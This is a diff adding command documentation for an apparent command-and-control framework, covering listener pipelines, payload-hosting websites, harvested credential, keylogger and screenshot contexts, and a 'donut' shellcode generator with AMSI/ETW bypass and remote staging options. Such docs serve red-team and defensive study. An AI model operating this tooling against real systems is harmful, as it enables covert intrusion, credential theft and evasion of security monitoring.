@@ -755,6 +755,362 @@ mal remove [mal]
 
 * [mal](#mal)	 - mal commands
 
+### config
+Config operations
+
+```
+config
+```
+
+**SEE ALSO**
+
+* [config github](#config-github)	 - Show Github config and more operations
+* [config notify](#config-notify)	 - Show Notify config and more operations
+* [config refresh](#config-refresh)	 - Refresh config
+
+#### config github
+Show Github config and more operations
+
+```
+config github
+```
+
+**SEE ALSO**
+
+* [config](#config)	 - Config operations
+* [config github update](#config-github-update)	 - Update Github config
+
+#### config github update
+Update Github config
+
+```
+config github update [flags]
+```
+
+**Options**
+
+```
+      --owner string          github owner
+      --repo string           github repo
+      --token string          github token
+      --workflowFile string   github workflow file
+```
+
+**SEE ALSO**
+
+* [config github](#config-github)	 - Show Github config and more operations
+
+#### config notify
+Show Notify config and more operations
+
+```
+config notify
+```
+
+**SEE ALSO**
+
+* [config](#config)	 - Config operations
+* [config notify update](#config-notify-update)	 - Update Notify config
+
+#### config notify update
+Update Notify config
+
+```
+config notify update [flags]
+```
+
+**Options**
+
+```
+      --dingtalk-enable           enable dingtalk
+      --dingtalk-secret string    dingtalk secret
+      --dingtalk-token string     dingtalk token
+      --lark-enable               enable lark
+      --lark-webhook-url string   lark webhook url
+      --serverchan-enable         enable serverchan
+      --serverchan-url string     serverchan url
+      --telegram-chat-id int      telegram chat id
+      --telegram-enable           enable telegram
+      --telegram-token string     telegram token
+```
+
+**SEE ALSO**
+
+* [config notify](#config-notify)	 - Show Notify config and more operations
+
+#### config refresh
+Refresh config
+
+```
+config refresh [flags]
+```
+
+**Options**
+
+```
+      --client   Refresh client config
+```
+
+**SEE ALSO**
+
+* [config](#config)	 - Config operations
+
+### context
+Context management
+
+**Description**
+
+Manage different types of contexts (download, upload, credential, etc)
+
+```
+context
+```
+
+**SEE ALSO**
+
+* [context credential](#context-credential)	 - List credential contexts
+* [context download](#context-download)	 - List download contexts
+* [context keylogger](#context-keylogger)	 - List keylogger contexts
+* [context port](#context-port)	 - List port scan contexts
+* [context screenshot](#context-screenshot)	 - List screenshot contexts
+* [context upload](#context-upload)	 - List upload contexts
+
+#### context credential
+List credential contexts
+
+```
+context credential
+```
+
+**SEE ALSO**
+
+* [context](#context)	 - Context management
+
+#### context download
+List download contexts
+
+```
+context download
+```
+
+**SEE ALSO**
+
+* [context](#context)	 - Context management
+
+#### context keylogger
+List keylogger contexts
+
+```
+context keylogger
+```
+
+**SEE ALSO**
+
+* [context](#context)	 - Context management
+
+#### context port
+List port scan contexts
+
+```
+context port
+```
+
+**SEE ALSO**
+
+* [context](#context)	 - Context management
+
+#### context screenshot
+List screenshot contexts
+
+```
+context screenshot
+```
+
+**SEE ALSO**
+
+* [context](#context)	 - Context management
+
+#### context upload
+List upload contexts
+
+```
+context upload
+```
+
+**SEE ALSO**
+
+* [context](#context)	 - Context management
+
+### sync
+Sync context
+
+**Description**
+
+sync context from server
+
+```
+sync [context_id]
+```
+
+**Examples**
+
+~~~
+sync [context_id]
+~~~
+
+### cert
+Cert list
+
+```
+cert
+```
+
+**Examples**
+
+~~~
+cert
+~~~
+
+**SEE ALSO**
+
+* [cert delete](#cert-delete)	 - 
+* [cert download](#cert-download)	 - download a cert
+* [cert import](#cert-import)	 - import a new cert
+* [cert self_signed](#cert-self_signed)	 - generate a self-signed cert
+* [cert update](#cert-update)	 - update a cert
+
+#### cert delete
+```
+
+![cert delete](/wiki/IoM/assets/cert_delete.png)
+cert delete
+```
+
+**Examples**
+
+~~~
+// delete a cert
+cert delete cert-name
+~~~
+
+**SEE ALSO**
+
+* [cert](#cert)	 - Cert list
+
+#### cert download
+download a cert
+
+![cert download](/wiki/IoM/assets/cert_download.png)
+
+```
+cert download [flags]
+```
+
+**Examples**
+
+~~~
+// download a cert
+cert download cert-name -o cert_path 
+~~~
+
+**Options**
+
+```
+  -o, --output string   cert save path
+```
+
+**SEE ALSO**
+
+* [cert](#cert)	 - Cert list
+
+#### cert import
+import a new cert
+
+```
+cert import [flags]
+```
+
+**Examples**
+
+~~~
+// generate a imported cert to server
+cert import --cert cert_file_path --key key_file_path --ca-cert ca_cert_path
+~~~
+
+**Options**
+
+```
+      --ca-cert string   tls ca cert path
+      --cert string      tls cert path
+      --key string       tls key path
+```
+
+**SEE ALSO**
+
+* [cert](#cert)	 - Cert list
+
+#### cert self_signed
+generate a self-signed cert
+
+```
+cert self_signed [flags]
+```
+
+**Examples**
+
+~~~
+// generate a self-signed cert without using certificate information
+cert selfSign
+
+// generate a self-signed cert using certificate information
+cert selfSign --CN commonName --O "Example Organization" --C US --L "San Francisco" --OU "IT Department" --ST California --validity 365
+~~~
+
+**Options**
+
+```
+      --C string          Certificate Country (C)
+      --CN string         Certificate Common Name (CN)
+      --L string          Certificate Locality/City (L)
+      --O string          Certificate Organization (O)
+      --OU string         Certificate Organizational Unit (OU)
+      --ST string         Certificate State/Province (ST)
+      --validity string   Certificate validity period in days (default "365")
+```
+
+**SEE ALSO**
+
+* [cert](#cert)	 - Cert list
+
+#### cert update
+update a cert
+
+![cert update](/wiki/IoM/assets/cert_update.png)
+
+```
+cert update [flags]
+```
+
+**Examples**
+
+~~~
+// update a cert
+cert update cert-name --cert cert_path --key key_path --type imported
+~~~
+
+**Options**
+
+```
+      --ca-cert string   tls ca cert path
+      --cert string      tls cert path
+      --key string       tls key path
+      --type string      cert type
+```
+
+**SEE ALSO**
+
+* [cert](#cert)	 - Cert list
+
 ## listener
 ### job
 List jobs in server
@@ -886,6 +1242,476 @@ pipeline stop tcp_test
 **SEE ALSO**
 
 * [pipeline](#pipeline)	 - manage pipeline
+
+### website
+Register a new website
+
+![website](/wiki/IoM/assets/website.gif)
+
+**Description**
+
+Register a new website with the specified listener. If **name** is not provided, it will be generated in the format **listenerID_web_port**.
+
+```
+website [flags]
+```
+
+**Examples**
+
+~~~
+// Register a website with the default settings
+website web_test --listener tcp_default --root /webtest
+
+// Register a website with a custom name and port
+website web_test --listener tcp_default --port 5003 --root /webtest
+
+// Register a website with TLS enabled
+website web_test --listener tcp_default --root /webtest --tls --cert /path/to/cert --key /path/to/key
+~~~
+
+**Options**
+
+```
+      --acme               auto cert by let's encrypt
+      --cert string        tls cert path
+      --cert-name string   certificate name
+      --domain string      auto cert domain
+      --host string        pipeline host, the default value is **0.0.0.0** (default "0.0.0.0")
+      --ip string          external ip (default "ip")
+      --key string         tls key path
+  -l, --listener string    listener id
+  -p, --port uint32        pipeline port, random port is selected from the range **10000-15000** 
+      --root string        website root path (default "/")
+  -t, --tls                enable tls
+```
+
+**SEE ALSO**
+
+* [website add](#website-add)	 - Add content to a website
+* [website list](#website-list)	 - List website in listener
+* [website list-content](#website-list-content)	 - List content in a website
+* [website remove](#website-remove)	 - Remove content from a website
+* [website start](#website-start)	 - Start a website
+* [website stop](#website-stop)	 - Stop a website
+* [website update](#website-update)	 - Update content in a website
+
+#### website add
+Add content to a website
+
+**Description**
+
+Add new content to an existing website
+
+```
+website add [file_path] [flags]
+```
+
+**Examples**
+
+~~~
+// Add content to a website with default web path (using filename)
+website add /path/to/content.html --website web_test
+
+// Add content to a website with custom web path and type
+website add /path/to/content.html --website web_test --path /custom/path --type text/html
+~~~
+
+**Options**
+
+```
+      --path string      web path for the content (defaults to filename)
+      --type string      content type of the file (default "raw")
+      --website string   website name (required)
+```
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+#### website list
+List website in listener
+
+**Description**
+
+Use a table to list websites along with their corresponding listeners
+
+```
+website list
+```
+
+**Examples**
+
+~~~
+website [listener]
+~~~
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+#### website list-content
+List content in a website
+
+**Description**
+
+List all content in a website with detailed information
+
+```
+website list-content [website_name]
+```
+
+**Examples**
+
+~~~
+// List all content in a website with detailed information
+website list-content web_test
+~~~
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+#### website remove
+Remove content from a website
+
+**Description**
+
+Remove content from an existing website using content ID
+
+```
+website remove [content_id]
+```
+
+**Examples**
+
+~~~
+// Remove content from a website using content ID
+website remove 123e4567-e89b-12d3-a456-426614174000
+~~~
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+#### website start
+Start a website
+
+**Description**
+
+Start a website with the specified name
+
+```
+website start [name]
+```
+
+**Examples**
+
+~~~
+// Start a website
+website start web_test 
+~~~
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+#### website stop
+Stop a website
+
+**Description**
+
+Stop a website with the specified name
+
+```
+website stop [name] [flags]
+```
+
+**Examples**
+
+~~~
+// Stop a website
+website stop web_test --listener tcp_default
+~~~
+
+**Options**
+
+```
+      --listener string   listener ID
+```
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+#### website update
+Update content in a website
+
+**Description**
+
+Update existing content in a website using content ID
+
+```
+website update [content_id] [file_path] [flags]
+```
+
+**Examples**
+
+~~~
+// Update content in a website with content ID
+website update 123e4567-e89b-12d3-a456-426614174000 /path/to/new_content.html --website web_test
+~~~
+
+**Options**
+
+```
+      --type string      content type of the file (default "raw")
+      --website string   website name (required)
+```
+
+**SEE ALSO**
+
+* [website](#website)	 - Register a new website
+
+### bind
+Register a new bind pipeline and start it
+
+```
+bind [flags]
+```
+
+**Examples**
+
+
+new bind pipeline
+~~~
+bind listener
+~~~
+
+
+**Options**
+
+```
+      --listener string   listener id
+```
+
+### http
+Register a new HTTP pipeline and start it
+
+**Description**
+
+Register a new HTTP pipeline with the specified listener.
+
+```
+http [flags]
+```
+
+**Examples**
+
+~~~
+// Register an HTTP pipeline with the default settings
+http --listener http_default
+
+// Register an HTTP pipeline with custom headers and error page
+http --name http_test --listener http_default --host 192.168.0.43 --port 8080 --headers "Content-Type=text/html" --error-page /path/to/error.html
+
+// Register an HTTP pipeline with TLS enabled
+http --listener http_default --tls --cert_path /path/to/cert --key_path /path/to/key
+~~~
+
+**Options**
+
+```
+      --acme                     auto cert by let's encrypt
+      --cert string              tls cert path
+      --cert-name string         certificate name
+      --domain string            auto cert domain
+      --encryption-key string    encryption key
+      --encryption-type string   encryption type
+      --error-page string        Path to custom error page file
+      --headers stringToString   HTTP response headers (key=value) (default [])
+      --host string              pipeline host, the default value is **0.0.0.0** (default "0.0.0.0")
+      --ip string                external ip (default "ip")
+      --key string               tls key path
+  -l, --listener string          listener id
+      --parser string            pipeline parser (default "default")
+  -p, --port uint32              pipeline port, random port is selected from the range **10000-15000** 
+  -t, --tls                      enable tls
+```
+
+### rem
+```
+rem
+```
+
+**Examples**
+
+~~~
+rem
+~~~
+
+**SEE ALSO**
+
+* [rem delete](#rem-delete)	 - Delete a REM
+* [rem list](#rem-list)	 - List REMs in listener
+* [rem new](#rem-new)	 - Register a new REM and start it
+* [rem start](#rem-start)	 - Start a REM
+* [rem stop](#rem-stop)	 - Stop a REM
+
+#### rem delete
+Delete a REM
+
+```
+rem delete
+```
+
+**Examples**
+
+~~~
+rem delete rem_test
+~~~
+
+**SEE ALSO**
+
+* [rem](#rem)	 - 
+
+#### rem list
+List REMs in listener
+
+**Description**
+
+Use a table to list REMs along with their corresponding listeners
+
+```
+rem list [listener]
+```
+
+**Examples**
+
+~~~
+rem
+~~~
+
+**SEE ALSO**
+
+* [rem](#rem)	 - 
+
+#### rem new
+Register a new REM and start it
+
+**Description**
+
+Register a new REM with the specified listener.
+
+```
+rem new [name] [flags]
+```
+
+**Examples**
+
+~~~
+// Register a REM with the default settings
+rem new --listener listener_id
+
+// Register a REM with a custom name and console URL
+rem new --name rem_test --listener listener_id -c tcp://127.0.0.1:19966
+~~~
+
+**Options**
+
+```
+  -c, --console string    REM console URL (default "tcp://0.0.0.0")
+  -l, --listener string   listener id
+```
+
+**SEE ALSO**
+
+* [rem](#rem)	 - 
+
+#### rem start
+Start a REM
+
+**Description**
+
+Start a REM with the specified name
+
+```
+rem start
+```
+
+**Examples**
+
+~~~
+rem start rem_test
+~~~
+
+**SEE ALSO**
+
+* [rem](#rem)	 - 
+
+#### rem stop
+Stop a REM
+
+**Description**
+
+Stop a REM with the specified name
+
+```
+rem stop
+```
+
+**Examples**
+
+~~~
+rem stop rem_test
+~~~
+
+**SEE ALSO**
+
+* [rem](#rem)	 - 
+
+### tcp
+Register a new TCP pipeline and start it
+
+![tcp](/wiki/IoM/assets/tcp.gif)
+
+**Description**
+
+Register a new TCP pipeline with the specified listener.
+
+```
+tcp [flags]
+```
+
+**Examples**
+
+~~~
+// Register a TCP pipeline with the default settings
+tcp --listener tcp_default
+
+// Register a TCP pipeline with a custom name, host, and port
+tcp --name tcp_test --listener tcp_default --host 192.168.0.43 --port 5003
+
+// Register a TCP pipeline with TLS enabled and specify certificate and key paths
+tcp --listener tcp_default --tls --cert_path /path/to/cert --key_path /path/to/key
+~~~
+
+**Options**
+
+```
+      --acme                     auto cert by let's encrypt
+      --cert string              tls cert path
+      --cert-name string         certificate name
+      --domain string            auto cert domain
+      --encryption-key string    encryption key
+      --encryption-type string   encryption type
+      --host string              pipeline host, the default value is **0.0.0.0** (default "0.0.0.0")
+      --ip string                external ip (default "ip")
+      --key string               tls key path
+  -l, --listener string          listener id
+      --parser string            pipeline parser (default "default")
+  -p, --port uint32              pipeline port, random port is selected from the range **10000-15000** 
+  -t, --tls                      enable tls
+```
 
 ## generator
 ### artifact
@@ -1358,4 +2184,88 @@ profile new --name my_profile --pipeline default_tcp
 **SEE ALSO**
 
 * [profile](#profile)	 - compile profile 
+
+### donut
+donut cmd
+
+**Description**
+
+Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory 
+
+```
+donut [flags]
+```
+
+**Examples**
+
+
+  gonut -i c2.dll
+  gonut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll
+  gonut -i loader.dll -c TestClass -m RunProcess -p "calc notepad" -s http://remote_server.com/modules/
+  gonut -z2 -k2 -t -i loader.exe -o out.bin
+
+
+**Options**
+
+```
+  -a, --arch int          Target architecture:
+                          	1=x86
+                          	2=amd64
+                          	3=x86+amd64
+                          	 (default 3)
+  -p, --args string       Optional parameters/command line inside quotations for DLL method/function or EXE.
+  -b, --bypass uint32     Bypass AMSI/WLDP/ETW:
+                          	1=None
+                          	2=Abort on fail
+                          	3=Continue on fail
+                          	 (default 3)
+  -c, --class string      Optional class name. (required for .NET DLL, format: namespace.class)
+  -z, --compress uint32   Pack/Compress file:
+                          	1=None
+                          	2=aPLib         [experimental]
+                          	3=LZNT1  (RTL)  [experimental, Windows only]
+                          	4=Xpress (RTL)  [experimental, Windows only]
+                          	5=LZNT1         [experimental]
+                          	6=Xpress        [experimental, recommended]
+                          	 (default 1)
+  -j, --decoy string      Optional path of decoy module for Module Overloading.
+  -d, --domain string     AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.
+  -e, --entropy uint32    Entropy:
+                          	1=None
+                          	2=Use random names
+                          	3=Random names + symmetric encryption
+                          	 (default 3)
+  -x, --exit uint32       Exit behaviour:
+                          	1=Exit thread
+                          	2=Exit process
+                          	3=Do not exit or cleanup and block indefinitely
+                          	 (default 1)
+  -f, --format int        Output format:
+                          	1=Binary
+                          	2=Base64
+                          	3=C
+                          	4=Ruby
+                          	5=Python
+                          	6=Powershell
+                          	7=C#
+                          	8=Hex
+                          	9=UUID
+                          	10=Golang
+                          	11=Rust
+                          	 (default 1)
+  -k, --headers uint32    Preserve PE headers:
+                          	1=Overwrite
+                          	2=Keep all
+                          	 (default 1)
+  -i, --input string      Input file to execute in-memory.
+  -m, --method string     Optional method or function for DLL. (a method is required for .NET DLL)
+  -n, --modname string    Module name for HTTP staging. If entropy is enabled, this is generated randomly.
+  -y, --oep uint32        Create thread for loader and continue execution at <addr> supplied. (eg. 0x1234)
+  -o, --output string     Output file to save loader. (default "shellcode")
+  -r, --runtime string    CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.
+  -s, --server string     Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/
+  -t, --thread            Execute the entrypoint of an unmanaged EXE as a thread.
+  -w, --unicode           Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
+  -v, --verbose           verbose output
+```
 
